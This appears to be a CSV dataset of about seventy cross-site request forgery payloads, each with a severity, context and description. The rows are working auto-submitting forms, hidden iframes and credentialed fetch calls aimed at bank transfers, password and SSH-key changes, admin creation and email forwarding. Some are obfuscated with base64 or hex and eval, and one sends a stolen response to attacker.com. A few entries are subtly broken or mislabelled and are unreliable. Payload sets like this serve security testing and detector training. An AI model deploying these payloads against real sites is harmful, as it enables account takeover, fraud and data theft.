id,attack_class,payload,type,severity,context,description,example
csrf-021,csrf,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",CSRF,high,Malicious webpage,CSRF using stealth iframe with delayed form submission,
csrf-022,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>",CSRF,critical,Malicious webpage,CSRF using fetch with chained promises to exfiltrate response,
csrf-023,csrf,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with multiple hidden inputs and auto-submit,
csrf-024,csrf,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">",CSRF,high,Malicious webpage,CSRF using image with onload event triggering XMLHttpRequest,
csrf-026,csrf,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",CSRF,medium,Malicious webpage,CSRF using beacon API with custom payload,
csrf-027,csrf,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with enctype multipart/form-data and auto-submit,
csrf-028,csrf,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",CSRF,high,Malicious webpage,CSRF using iframe with srcdoc containing auto-submitting form,
csrf-029,csrf,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>",CSRF,high,Malicious webpage,CSRF using script with setTimeout to chain multiple requests,
csrf-030,csrf,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with target iframe and hidden inputs,
csrf-031,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>",CSRF,high,Malicious webpage,CSRF using fetch with spoofed headers (may bypass naive CSRF tokens),
csrf-032,csrf,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event modifying data,
csrf-033,csrf,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">",CSRF,high,Malicious webpage,CSRF using image with onerror event triggering fetch,
csrf-034,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh to redirect to GET endpoint,
csrf-035,csrf,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>,CSRF,critical,Malicious webpage,CSRF using script to create and submit form dynamically,
csrf-036,csrf,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with JSON payload (if API accepts),
csrf-037,csrf,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",CSRF,high,Malicious webpage,CSRF using form with multiple steps and chained submissions,
csrf-040,csrf,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",CSRF,high,Malicious webpage,CSRF using form with hidden iframe and delayed submission,
csrf-041,csrf,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>",CSRF,high,Malicious webpage,CSRF using script to create image with onload triggering fetch,
csrf-042,csrf,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",CSRF,high,Malicious webpage,CSRF using form with multiple hidden inputs and chained submission,
csrf-043,csrf,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with custom headers and JSON body,
csrf-044,csrf,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event to modify hidden input,
csrf-045,csrf,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">",CSRF,high,Malicious webpage,CSRF using image with onerror event to trigger XMLHttpRequest,
csrf-046,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh to redirect to sensitive GET endpoint,
csrf-047,csrf,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>",CSRF,critical,Malicious webpage,CSRF using script to dynamically create and submit form with delay,
csrf-048,csrf,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with JSON body and credentials,
csrf-049,csrf,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",CSRF,high,Malicious webpage,CSRF using chained form submissions with timeouts,
csrf-051,csrf,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Admin panel user management,CSRF to add admin user via hidden form,
csrf-052,csrf,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Email service user settings,CSRF to change email notification settings,
csrf-053,csrf,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>,CSRF,high,Security 2FA reset endpoint,CSRF to reset 2FA via GET request,
csrf-054,csrf,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>,CSRF,medium,Streaming service subscription,CSRF to subscribe victim to premium service,
csrf-055,csrf,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,E-commerce user profile,CSRF to change victim's shipping address,
csrf-056,csrf,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media friend management,CSRF to add attacker as friend,
csrf-057,csrf,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Blog comment submission,CSRF to post malicious comment,
csrf-058,csrf,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media profile update,CSRF to change victim's profile picture,
csrf-059,csrf,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Online banking transfer,CSRF to initiate money transfer,
csrf-060,csrf,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Security settings,CSRF to disable security alerts,
csrf-061,csrf,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,User account management,CSRF to change victim's password,
csrf-062,csrf,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Continuous Integration webhook settings,CSRF to add malicious webhook URL,
csrf-063,csrf,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,Calendar application settings,CSRF to change victim's timezone,
csrf-064,csrf,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Email forwarding settings,CSRF to enable auto-forwarding of emails,
csrf-065,csrf,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Git hosting service SSH keys,CSRF to add malicious SSH key,
csrf-066,csrf,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,User interface settings,CSRF to change victim's language preference,
csrf-067,csrf,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,Newsletter subscription,CSRF to add victim to attacker's mailing list,
csrf-068,csrf,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media posting,CSRF to post malicious tweet,
csrf-069,csrf,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,SMS spam management,CSRF to add victim's phone number to spam list,
csrf-070,csrf,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Payment gateway account settings,CSRF to change victim's default payment method,
csrf-071,csrf,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Code review platform settings,CSRF to enable auto-approve on code reviews,
csrf-072,csrf,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,IoT device management,CSRF to add victim's device to attacker's monitoring,
csrf-073,csrf,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Calendar event management,CSRF to change victim's calendar event,
csrf-074,csrf,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Firewall management,CSRF to add victim's IP to blacklist,
csrf-075,csrf,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,DNS management,CSRF to change victim's DNS settings,
csrf-076,csrf,<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,Mailing list subscription,CSRF to add victim to attacker's mailing list,
csrf-077,csrf,<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media profile,CSRF to change victim's profile bio,
csrf-079,csrf,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,App notification settings,CSRF to change victim's notification preferences,
csrf-080,csrf,<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Payment gateway,CSRF to add victim's credit card to attacker's account,
csrf-081,csrf,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>,CSRF,high,Dynamic base64 decoded form submission,CSRF with base64 encoded form and dynamic decoding,
csrf-082,csrf,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>,CSRF,high,Hex encoded script with eval,CSRF with hex encoded script and eval,
csrf-083,csrf,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();</script>');d.close();</script>",CSRF,high,Dynamic iframe with form,CSRF with dynamically created iframe and delayed form submission,
csrf-084,csrf,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,CSRF,high,String concatenation obfuscation,CSRF with obfuscated string concatenation,
csrf-085,csrf,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>",CSRF,medium,User interaction triggered CSRF,CSRF with event-triggered form submission on mouseover,
csrf-086,csrf,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>",CSRF,high,Delayed form submission,CSRF with delayed execution using setTimeout and obfuscated function,
csrf-087,csrf,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,CSRF,high,Encoded element creation,CSRF with encoded URI components and dynamic decoding,
csrf-088,csrf,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>",CSRF,critical,Stealth iframe with postMessage,CSRF with stealth iframe and form submission via postMessage,
csrf-089,csrf,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,CSRF,high,String split and join obfuscation,CSRF with obfuscated script using string split and join,
csrf-090,csrf,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();</script>';</script>",CSRF,critical,Script injection via innerHTML,CSRF with script tag injection via innerHTML,
csrf-091,csrf,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>,CSRF,critical,Base64 encoded eval obfuscation,CSRF with obfuscated base64 and eval,
csrf-092,csrf,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>",CSRF,high,SVG embedded script,CSRF with SVG image and embedded script,
csrf-093,csrf,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>,CSRF,medium,Meta refresh with URL encoding,CSRF with meta refresh and URL encoded payload,
csrf-094,csrf,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>",CSRF,high,JavaScript URL with obfuscation,CSRF with JavaScript URL and obfuscated payload,
csrf-095,csrf,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>",CSRF,high,Image onerror event trigger,CSRF with hidden image and onerror event,
csrf-096,csrf,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,CSRF,high,Unicode escape obfuscation,CSRF with obfuscated Unicode escapes,
csrf-097,csrf,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>",CSRF,high,CSS expression injection,CSRF with CSS expression to trigger script,
csrf-098,csrf,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>",CSRF,critical,XHR POST request,CSRF with XMLHttpRequest and obfuscated URL,
csrf-099,csrf,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>,CSRF,medium,CSS animation event trigger,CSRF with form submission triggered by CSS animation,
